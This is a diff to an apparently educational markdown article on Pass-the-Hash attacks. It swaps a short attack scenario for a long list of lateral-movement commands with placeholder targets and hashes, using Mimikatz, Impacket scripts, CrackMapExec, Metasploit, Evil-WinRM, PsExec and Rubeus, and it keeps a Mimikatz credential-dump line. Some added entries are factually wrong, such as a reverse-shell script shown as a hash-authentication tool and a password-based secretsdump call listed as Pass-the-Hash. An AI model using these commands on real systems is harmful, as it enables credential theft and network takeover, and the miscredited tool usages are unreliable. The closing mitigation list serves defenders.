@@ -30,29 +30,64 @@ mimikatz.exe privilege::debug sekurlsa::logonpasswords
 
 2. **Use the captured hash for authentication**: Once the password hash is obtained, the attacker can use it to authenticate to network resources. Tools like PsExec or CrackMapExec can be used to perform PtH attacks.
 
-Example command using PsExec:
+### For Kali Linux/Linux
 
+1. **Impacket (pth-winexe)**
 ```bash
-psexec.exe \\TARGET-SYSTEM -u TARGET-USER -p PASSWORD-HASH cmd.exe
+pth-winexe -U TARGET_DOMAIN/USER%NTLM_HASH //TARGET_IP cmd
+```
+2. **Impacket (secretsdump.py)**
+```bash
+python3 secretsdump.py -ntds TARGET_DOMAIN/USER:PASSWORD@TARGET_IP
+```
+3. **CrackMapExec**
+```bash
+crackmapexec smb TARGET_IP -u USER -H NTLM_HASH
+```
+4. **Metasploit Framework (auxiliary module: smb_login)**
+```bash
+msfconsole
+use auxiliary/scanner/smb/smb_login
+set RHOSTS TARGET_IP
+set SMBDomain TARGET_DOMAIN
+set SMBUser USER
+set SMBPass NTLM_HASH
+run
+```
+5. **Evil-WinRM**
+```bash
+evil-winrm -i TARGET_IP -u USER --hash NTLM_HASH
+```
+6. **Wmiexec**
+```bash
+wmiexec.py -hashes LM_HASH:NTLM_HASH TARGET_DOMAIN/USER@TARGET_IP
+```
+7. **Smbexec**
+```bash
+smbexec.py -hashes LM_HASH:NTLM_HASH TARGET_DOMAIN/USER@TARGET_IP
 ```
 
+### For Windows
 
-Example command using CrackMapExec:
-
+1. **Mimikatz**
 ```bash
-crackmapexec smb TARGET-IP -u TARGET-USER -H PASSWORD-HASH -x "cmd.exe"
+mimikatz.exe "sekurlsa::pth /user:USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe" "exit"
 ```
 
+2. **PowerShell Empire**
+```bash
+.\Invoke-PowerShellTcp.ps1 -Hash NTLM_HASH -Username USER -Domain TARGET_DOMAIN -IPAddress TARGET_IP
+```
 
-## Real-World Attack Scenario
+3. **PsExec**
+```bash
+psexec.exe \\TARGET_IP -u TARGET_DOMAIN\USER -p NTLM_HASH cmd.exe
+```
+4. **Rubeus**
+```bash
+Rubeus.exe pth /user:USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /target:TARGET_IP
+```
 
-Here's an example scenario illustrating how a Pass-the-Hash attack could unfold:
-
-1. An attacker gains access to a low-privileged user's machine via a phishing attack or exploiting a software vulnerability.
-2. The attacker uses a tool like Mimikatz to dump password hashes from the system's memory.
-3. The attacker identifies a high-privileged user's password hash, such as a domain administrator.
-4. Using PsExec or CrackMapExec, the attacker leverages the captured domain administrator's hash to authenticate to a domain controller.
-5. The attacker gains domain administrator privileges, enabling them to access sensitive data, create new user accounts, or modify existing accounts for persistence.
 
 ## Conclusion
 
@@ -65,4 +100,3 @@ Pass-the-Hash attacks are dangerous because they exploit inherent weaknesses in 
 - Restricting the use of administrative accounts
 
 Understanding how Pass-the-Hash attacks work, along with effective mitigation strategies, is essential to protect your organization from unauthorized access and data breaches.
-
